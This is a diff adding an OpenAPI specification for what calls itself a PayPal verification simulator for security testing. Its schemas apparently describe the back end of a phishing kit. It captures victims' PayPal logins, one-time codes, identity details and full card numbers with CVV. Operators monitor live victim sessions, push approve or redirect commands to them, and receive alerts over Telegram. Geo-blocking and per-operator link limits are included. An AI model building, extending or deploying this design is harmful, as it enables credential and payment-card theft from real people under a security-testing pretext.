@@ -1,0 +1,551 @@
+openapi: 3.0.3
+info:
+  title: PayPal Verification API
+  description: |
+    High-fidelity PayPal verification simulator API for security testing and demonstration.
+
+    ## Features
+    - Real-time session monitoring
+    - Multi-admin support with personalized settings
+    - Telegram integration for notifications
+    - Geo-blocking capabilities
+    - Comprehensive audit logging
+
+    ## Security
+    - JWT-based authentication for admin endpoints
+    - Rate limiting and input validation
+    - XSS protection and sanitization
+    - CSP headers and security middleware
+  version: "1.0.0"
+  contact:
+    name: Security Team
+    email: security@example.com
+  license:
+    name: MIT
+    url: https://opensource.org/licenses/MIT
+
+servers:
+  - url: http://localhost:8080
+    description: Development server
+  - url: https://api.paypal-verifier.com
+    description: Production server
+
+security:
+  - bearerAuth: []
+
+paths:
+  /api/health:
+    get:
+      summary: Health check endpoint
+      description: Returns the health status of the application
+      security: []  # No authentication required
+      responses:
+        '200':
+          description: Application is healthy
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    example: "ok"
+                  timestamp:
+                    type: number
+                    example: 1703123456789
+
+  /api/sync:
+    post:
+      summary: Synchronize session state
+      description: |
+        Synchronizes user session state with the server. Used for real-time monitoring
+        and session persistence across page reloads.
+      security: []  # Client-side endpoint
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/SessionSync'
+      responses:
+        '200':
+          description: Session synchronized successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    example: "ok"
+                  command:
+                    $ref: '#/components/schemas/AdminCommand'
+                  settings:
+                    $ref: '#/components/schemas/AdminSettings'
+        '400':
+          description: Invalid session data
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/settings:
+    get:
+      summary: Get global settings
+      description: Retrieve global application settings
+      responses:
+        '200':
+          description: Settings retrieved successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                additionalProperties: true
+    post:
+      summary: Update global settings
+      description: Update global application settings
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                tgToken:
+                  type: string
+                  description: Telegram bot token
+                tgChat:
+                  type: string
+                  description: Telegram chat ID
+                gateUser:
+                  type: string
+                  description: Admin gate username
+                gatePass:
+                  type: string
+                  description: Admin gate password
+      responses:
+        '200':
+          description: Settings updated successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    example: "ok"
+
+  /api/admin/gate:
+    post:
+      summary: Admin gate check
+      description: Initial authentication check for admin access
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required:
+                - username
+                - password
+              properties:
+                username:
+                  type: string
+                password:
+                  type: string
+      responses:
+        '200':
+          description: Gate passed
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    example: "ok"
+        '401':
+          description: Invalid credentials
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/admin/login:
+    post:
+      summary: Admin login
+      description: Authenticate admin user and return JWT token
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required:
+                - username
+                - password
+              properties:
+                username:
+                  type: string
+                password:
+                  type: string
+      responses:
+        '200':
+          description: Login successful
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    example: "ok"
+                  token:
+                    type: string
+                    description: JWT token for authentication
+                  user:
+                    $ref: '#/components/schemas/AdminUser'
+        '401':
+          description: Invalid credentials
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/admin/me:
+    get:
+      summary: Get current admin user
+      description: Retrieve information about the currently authenticated admin user
+      responses:
+        '200':
+          description: User information retrieved
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/AdminUser'
+        '401':
+          description: Not authenticated
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/sessions:
+    get:
+      summary: Get active sessions
+      description: Retrieve list of active user sessions for monitoring
+      parameters:
+        - name: adminId
+          in: query
+          schema:
+            type: string
+          description: Filter sessions by admin ID
+      responses:
+        '200':
+          description: Sessions retrieved successfully
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/Session'
+        '401':
+          description: Not authenticated
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/command:
+    post:
+      summary: Send admin command
+      description: Send a command to a user session (approve, reject, navigate)
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required:
+                - sessionId
+                - action
+              properties:
+                sessionId:
+                  type: string
+                  description: Target session ID
+                action:
+                  type: string
+                  enum: [APPROVE, REJECT, NAVIGATE, EXTEND_TIMEOUT, SET_FLOW]
+                payload:
+                  type: object
+                  description: Action-specific payload
+      responses:
+        '200':
+          description: Command queued successfully
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    example: "queued"
+        '400':
+          description: Invalid command
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/sessions/{id}/revoke:
+    post:
+      summary: Revoke session
+      description: Revoke access for a specific user session
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+          description: Session ID to revoke
+      responses:
+        '200':
+          description: Session revoked
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    example: "revoked"
+        '404':
+          description: Session not found
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Error'
+
+  /api/admin/users:
+    get:
+      summary: List admin users
+      description: Retrieve list of admin users (hypervisor only)
+      responses:
+        '200':
+          description: Users retrieved
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/AdminUser'
+    post:
+      summary: Create admin user
+      description: Create a new admin user (hypervisor only)
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required:
+                - username
+                - password
+              properties:
+                username:
+                  type: string
+                password:
+                  type: string
+                role:
+                  type: string
+                  enum: [admin, hypervisor]
+                  default: admin
+                uniqueCode:
+                  type: string
+      responses:
+        '200':
+          description: User created
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
+                    example: "ok"
+                  id:
+                    type: string
+
+components:
+  schemas:
+    Error:
+      type: object
+      properties:
+        error:
+          type: string
+        details:
+          type: array
+          items:
+            type: object
+
+    SessionSync:
+      type: object
+      required:
+        - sessionId
+      properties:
+        sessionId:
+          type: string
+        currentView:
+          type: string
+        stage:
+          type: string
+        email:
+          type: string
+        password:
+          type: string
+        phoneNumber:
+          type: string
+        phoneCode:
+          type: string
+        firstName:
+          type: string
+        lastName:
+          type: string
+        dob:
+          type: string
+        address:
+          type: string
+        country:
+          type: string
+        cardNumber:
+          type: string
+        cardType:
+          type: string
+        cardExpiry:
+          type: string
+        cardCvv:
+          type: string
+        cardOtp:
+          type: string
+        fingerprint:
+          $ref: '#/components/schemas/Fingerprint'
+        adminCode:
+          type: string
+
+    Fingerprint:
+      type: object
+      properties:
+        userAgent:
+          type: string
+        language:
+          type: string
+        platform:
+          type: string
+        screenResolution:
+          type: string
+        ip:
+          type: string
+
+    AdminCommand:
+      type: object
+      properties:
+        action:
+          type: string
+          enum: [APPROVE, REJECT, NAVIGATE, EXTEND_TIMEOUT, SET_FLOW]
+        payload:
+          type: object
+
+    AdminSettings:
+      type: object
+      properties:
+        autoApproveLogin:
+          type: boolean
+        skipPhone:
+          type: boolean
+        skipCard:
+          type: boolean
+        skipBank:
+          type: boolean
+        redirectUrl:
+          type: string
+        forceBankApp:
+          type: boolean
+        allowedCountries:
+          type: array
+          items:
+            type: string
+        blockedCountries:
+          type: array
+          items:
+            type: string
+
+    Session:
+      type: object
+      properties:
+        id:
+          type: string
+        sessionId:
+          type: string
+        timestamp:
+          type: number
+        lastSeen:
+          type: number
+        email:
+          type: string
+        name:
+          type: string
+        status:
+          type: string
+        stage:
+          type: string
+        currentView:
+          type: string
+        fingerprint:
+          $ref: '#/components/schemas/Fingerprint'
+        data:
+          type: object
+        isPinned:
+          type: boolean
+        verificationFlow:
+          type: string
+        isLoginVerified:
+          type: boolean
+        isPhoneVerified:
+          type: boolean
+        isPersonalVerified:
+          type: boolean
+        isCardSubmitted:
+          type: boolean
+        isFlowComplete:
+          type: boolean
+
+    AdminUser:
+      type: object
+      properties:
+        id:
+          type: string
+        username:
+          type: string
+        role:
+          type: string
+          enum: [admin, hypervisor]
+        uniqueCode:
+          type: string
+        maxLinks:
+          type: number
+        settings:
+          type: object
+        telegramConfig:
+          type: object
+        isSuspended:
+          type: boolean
+        isImpersonated:
+          type: boolean
+
+  securitySchemes:
+    bearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
